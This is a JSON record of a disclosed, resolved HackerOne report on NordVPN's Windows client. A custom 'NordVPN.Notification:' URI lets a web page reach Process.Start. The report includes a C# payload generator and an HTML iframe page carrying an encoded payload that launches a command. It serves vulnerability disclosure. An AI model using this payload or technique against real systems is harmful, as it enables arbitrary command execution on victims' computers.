{
  "id": 1001255,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDAxMjU1",
  "url": "https://hackerone.com/reports/1001255",
  "title": "Possible RCE through Windows Custom Protocol on Windows client",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-10-07T15:48:53.463Z",
  "submitted_at": "2020-10-07T15:48:53.501Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cyku",
    "url": "/cyku",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fp8gnukpij009ml8wrjez9p1qclq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 17173,
    "url": "https://hackerone.com/nordsecurity",
    "handle": "nordsecurity",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/eptyogy5wqa70kmvct1tgqbaa2fw/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22nordsec-mountain.png%22%3B%20filename%2A%3DUTF-8%27%27nordsec-mountain.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVF4PHCL7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T072333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDguhK6TdXVdQ3RUynI5PKh5IBQuz3fCIv0RB9aA%2B0foAiAayFqT8jNhVwyLfGI7NzUAqv%2Bk0l3w9UIH0pHGthBCEyq6BQj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM8n9RG0dJ%2BRO3kY1FKo4F0W9fEZIeDhi10XDRKf49Az2ijyGknDncSGOVndFfN6dQ1JYqlsolzcjg6MfpKIXkzLssgcHUI%2BzLz7HdYGwLKSqWtfG5kabt6wYvO8Sfr6BvRvBMNHLddvutqdc%2Fzp%2BKkPpw6FV4mpRW%2FEo40DFpdnhLRaIOGUslOycAXBGH5i9%2FWQzH4ANj0MpRptspQbsO0pXEYg%2F8J2inQDc%2BrXgAitOrS83CqGazdQzWtC0QApcXIC7aOWFPkRkfDJyWsO%2BUT9GrDpYtKtGGq%2FmTXRI7DVjfQdjXvWbvduI5XrR%2B6O%2Bm5pzWE%2BRi%2B5pZFKcGZfg%2BI2aJ9rQfpeYwuU8HiE23IY219eHdvG%2F8GyxM%2FWkW1mRGt0GF8xlATnCKffGHilgRiU0a0WZ9tYXKZIJGKg7%2BWRGg8Lx1lT3Ai4bctxGfV6h1t0bhZyGitEfx8fR5Vy4ktrGmiBwmB5AIud%2BRsH8r7%2FBlpZb8rumO%2F6FaooBiKaFqhpJdslLCsN1BhrA5GEnNHotH6CB7Dr%2B5lv4qovDXNLX4dV5%2B%2BdgQmo10tqCkO%2FQRji%2BIA%2BE4lsF0XJ4oXj%2B90ZEftN2MabpKHGJ2FjufPHBbS4F5x0Li6DoaViXu2hIHVnocAEQJ1T%2FfXyOnUzZ2vx0ULz3dSfAPC%2BDQI%2B%2FkqTLF5tEFJCpMsGqa2ucUc5q0%2BzidXYyqu6tV9AbPYvYtAseRm6HPz%2FyK8bnKv4qIoliHyFauo5LRZZMv52Z44OPYpmUpK%2F7aYFVdFCePhSFIZeiuTmzXuh5SV%2FBmYieVpJUtwYAK1VLuper%2FlrvPfsVVqVve9hHToR4hkGmMzBD01pqN9spArXw%2FzMWW9xRghmKxNwHSWCCBEWyY7%2BiTMPSMvsYGOrIBVRE409BaZllJxy11mSYcqpVByatvSDY7GSjvU2FQc3Fg%2FnI2RsBuD%2F0gW%2FaYozc%2Fn2SGzpgP5GVBO%2FcLY%2BUgEb7EOvYDBvf77W8atCI4KTZDDvbbf3jEStwx3oa87G596d0eceAwMMMZHdYh3mVIqenVj0TVSyt2%2FNrg28GpCX%2BBTAQ7Oj3WOYkacbLEupe3J%2BRlDCVRapaL5zk6xIyUsGmpVQWFOS4Q5PEv%2BMLPrCdMDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9a567220dad647731ffcd7ee4cfcb187d843cfc1b0e901848f2507d52a7dfdd7",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/eptyogy5wqa70kmvct1tgqbaa2fw/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22nordsec-mountain.png%22%3B%20filename%2A%3DUTF-8%27%27nordsec-mountain.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVF4PHCL7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T072333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDguhK6TdXVdQ3RUynI5PKh5IBQuz3fCIv0RB9aA%2B0foAiAayFqT8jNhVwyLfGI7NzUAqv%2Bk0l3w9UIH0pHGthBCEyq6BQj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM8n9RG0dJ%2BRO3kY1FKo4F0W9fEZIeDhi10XDRKf49Az2ijyGknDncSGOVndFfN6dQ1JYqlsolzcjg6MfpKIXkzLssgcHUI%2BzLz7HdYGwLKSqWtfG5kabt6wYvO8Sfr6BvRvBMNHLddvutqdc%2Fzp%2BKkPpw6FV4mpRW%2FEo40DFpdnhLRaIOGUslOycAXBGH5i9%2FWQzH4ANj0MpRptspQbsO0pXEYg%2F8J2inQDc%2BrXgAitOrS83CqGazdQzWtC0QApcXIC7aOWFPkRkfDJyWsO%2BUT9GrDpYtKtGGq%2FmTXRI7DVjfQdjXvWbvduI5XrR%2B6O%2Bm5pzWE%2BRi%2B5pZFKcGZfg%2BI2aJ9rQfpeYwuU8HiE23IY219eHdvG%2F8GyxM%2FWkW1mRGt0GF8xlATnCKffGHilgRiU0a0WZ9tYXKZIJGKg7%2BWRGg8Lx1lT3Ai4bctxGfV6h1t0bhZyGitEfx8fR5Vy4ktrGmiBwmB5AIud%2BRsH8r7%2FBlpZb8rumO%2F6FaooBiKaFqhpJdslLCsN1BhrA5GEnNHotH6CB7Dr%2B5lv4qovDXNLX4dV5%2B%2BdgQmo10tqCkO%2FQRji%2BIA%2BE4lsF0XJ4oXj%2B90ZEftN2MabpKHGJ2FjufPHBbS4F5x0Li6DoaViXu2hIHVnocAEQJ1T%2FfXyOnUzZ2vx0ULz3dSfAPC%2BDQI%2B%2FkqTLF5tEFJCpMsGqa2ucUc5q0%2BzidXYyqu6tV9AbPYvYtAseRm6HPz%2FyK8bnKv4qIoliHyFauo5LRZZMv52Z44OPYpmUpK%2F7aYFVdFCePhSFIZeiuTmzXuh5SV%2FBmYieVpJUtwYAK1VLuper%2FlrvPfsVVqVve9hHToR4hkGmMzBD01pqN9spArXw%2FzMWW9xRghmKxNwHSWCCBEWyY7%2BiTMPSMvsYGOrIBVRE409BaZllJxy11mSYcqpVByatvSDY7GSjvU2FQc3Fg%2FnI2RsBuD%2F0gW%2FaYozc%2Fn2SGzpgP5GVBO%2FcLY%2BUgEb7EOvYDBvf77W8atCI4KTZDDvbbf3jEStwx3oa87G596d0eceAwMMMZHdYh3mVIqenVj0TVSyt2%2FNrg28GpCX%2BBTAQ7Oj3WOYkacbLEupe3J%2BRlDCVRapaL5zk6xIyUsGmpVQWFOS4Q5PEv%2BMLPrCdMDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18adf0767f1857a279e7f04a258fe21b6ab50cdeb54fcbec739777f2b385b027"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Nord Security",
      "twitter_handle": "NordNewsroom",
      "website": "https://nordsecurity.com/",
      "about": "Digital security and privacy for everyone"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-01-25T12:01:22.833Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2021-01-25T12:00:33.586Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThe NordVPN windows client application registered two custom protocols **NordVPN:** and **NordVPN.Notification:** for process communication. This makes us are able to  communicate with NordVPN.exe from web browser.\nAfter looking the executable binary, I noticed the class **NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl** eventually calls function  **Process.Start** with controllable argument, and this notification can be triggered through custom protocol **NordVPN.Notification:**. \nSo it's possible to execute arbitrary system command from web browser.\n\n## Steps To Reproduce:\n\n  1. Create the malicious URL, the below is my script to generate the URL, it requires importing \"Newtonsoft.Json.dll\" and \"NordVpn.Core.dll\".\n\n    ```csharp\n    // Program.cs\n    using System;\n    using System.Collections.Generic;\n    using NordVpn.Core.Tools;\n    using NordVpn.Core.Models.ToastNotifications.Notifications;\n    using System.Diagnostics;\n\n    namespace ExploitApp\n    {\n        class Program\n        {\n            static void Main(string[] args)\n            {\n                Dictionary<string, string> arguments = new Dictionary<string, string>();\n                arguments[\"OpenUrl\"] = \"calc.exe\";\n                NotificationActionArgs toastArgs = new NotificationActionArgs(\"\", arguments);\n                String exploit = ObjectCompressor.CompressObject(toastArgs);\n                Console.Write(String.Format(\"NordVPN.Notification:{0}\", exploit));\n                Console.ReadKey();\n            }\n        }\n    }\n    ```\n\n  2. Add the URL into a html file with iframe tag, then serves it on HTTP server.\n\n    ```html\n    <!-- exploit.html -->\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>Exploit</title>\n    </head>\n    <body>\n        <iframe src=\"NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA\"></iframe>\n    </body>\n    </html>\n    ```\n\n  3. Open the html file in the browser. Modern web browser may popup a window to confirm to open NordVPN.exe, if we choose \"Open NordVPN\", the command will be executed and popup a calc.exe.\n\n## Proof of Concept Gif\n\nTested on Windows client lastest version 6.31.5.0.\n\n{F1024995}\n\n## Additional Information\n\nThe below is the simple call stack to Process.Start from ListenNotificationOpenUrl.\n```\nNordVPN.exe/NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl.OnInteraction(NotificationActionArgs args)\n    NordVpn.Application.Core.dll/NordVpn.Application.Core.ViewModels.Shell.ShellViewModel.Handle(ShowBrowserMessage message)\n        NordVPN.exe/NordVpn.Views.Shell.FaultHandlingDefaultBrowser.Open(string url)\n            Process.Start(string fileName);\n```\n\n## Impact\n\nPossible to execute system command on victim's computer and take control of the computer.",
  "weakness": {
    "id": 59,
    "name": "OS Command Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1024995,
      "file_name": "possible_rce_in_windows_client.gif",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uWgJGiGkEYLckSb2J5iKzGAY?response-content-disposition=attachment%3B%20filename%3D%22possible_rce_in_windows_client.gif%22%3B%20filename%2A%3DUTF-8%27%27possible_rce_in_windows_client.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVF4PHCL7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T072333Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDguhK6TdXVdQ3RUynI5PKh5IBQuz3fCIv0RB9aA%2B0foAiAayFqT8jNhVwyLfGI7NzUAqv%2Bk0l3w9UIH0pHGthBCEyq6BQj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM8n9RG0dJ%2BRO3kY1FKo4F0W9fEZIeDhi10XDRKf49Az2ijyGknDncSGOVndFfN6dQ1JYqlsolzcjg6MfpKIXkzLssgcHUI%2BzLz7HdYGwLKSqWtfG5kabt6wYvO8Sfr6BvRvBMNHLddvutqdc%2Fzp%2BKkPpw6FV4mpRW%2FEo40DFpdnhLRaIOGUslOycAXBGH5i9%2FWQzH4ANj0MpRptspQbsO0pXEYg%2F8J2inQDc%2BrXgAitOrS83CqGazdQzWtC0QApcXIC7aOWFPkRkfDJyWsO%2BUT9GrDpYtKtGGq%2FmTXRI7DVjfQdjXvWbvduI5XrR%2B6O%2Bm5pzWE%2BRi%2B5pZFKcGZfg%2BI2aJ9rQfpeYwuU8HiE23IY219eHdvG%2F8GyxM%2FWkW1mRGt0GF8xlATnCKffGHilgRiU0a0WZ9tYXKZIJGKg7%2BWRGg8Lx1lT3Ai4bctxGfV6h1t0bhZyGitEfx8fR5Vy4ktrGmiBwmB5AIud%2BRsH8r7%2FBlpZb8rumO%2F6FaooBiKaFqhpJdslLCsN1BhrA5GEnNHotH6CB7Dr%2B5lv4qovDXNLX4dV5%2B%2BdgQmo10tqCkO%2FQRji%2BIA%2BE4lsF0XJ4oXj%2B90ZEftN2MabpKHGJ2FjufPHBbS4F5x0Li6DoaViXu2hIHVnocAEQJ1T%2FfXyOnUzZ2vx0ULz3dSfAPC%2BDQI%2B%2FkqTLF5tEFJCpMsGqa2ucUc5q0%2BzidXYyqu6tV9AbPYvYtAseRm6HPz%2FyK8bnKv4qIoliHyFauo5LRZZMv52Z44OPYpmUpK%2F7aYFVdFCePhSFIZeiuTmzXuh5SV%2FBmYieVpJUtwYAK1VLuper%2FlrvPfsVVqVve9hHToR4hkGmMzBD01pqN9spArXw%2FzMWW9xRghmKxNwHSWCCBEWyY7%2BiTMPSMvsYGOrIBVRE409BaZllJxy11mSYcqpVByatvSDY7GSjvU2FQc3Fg%2FnI2RsBuD%2F0gW%2FaYozc%2Fn2SGzpgP5GVBO%2FcLY%2BUgEb7EOvYDBvf77W8atCI4KTZDDvbbf3jEStwx3oa87G596d0eceAwMMMZHdYh3mVIqenVj0TVSyt2%2FNrg28GpCX%2BBTAQ7Oj3WOYkacbLEupe3J%2BRlDCVRapaL5zk6xIyUsGmpVQWFOS4Q5PEv%2BMLPrCdMDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c2d7d6d0bb3861521a76f7c5ba17730830f286e1e8d6dc2d660930c4bb6b2648",
      "file_size": 958920,
      "type": "image/gif",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2021-02-24T12:00:33.685Z",
  "allow_singular_disclosure_after": -144271379.7788749,
  "singular_disclosure_allowed": true,
  "vote_count": 119,
  "voters": [
    "taha",
    "pretorian",
    "act1on3",
    "keshavkejriwal",
    "xploiterr",
    "krevetk0",
    "wh0ru",
    "mashoud1122",
    "foobar7",
    "parsiya",
    "and 109 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 39383,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "NordVPN - Windows Executable",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 26427,
      "category": "team",
      "content": "The reporter has identified that the NordVPN windows client application have possible RCE through custom URI schema. Successful abuse allows malicious user to execute arbitrary system command by tricking user into visiting malicious URL via browser",
      "updated_at": "2021-01-25T12:00:27.674Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 1244155,
        "username": "javila",
        "name": "",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "",
        "location": "",
        "created_at": "2020-07-13T13:30:26.851Z",
        "url": "https://hackerone.com/javila",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
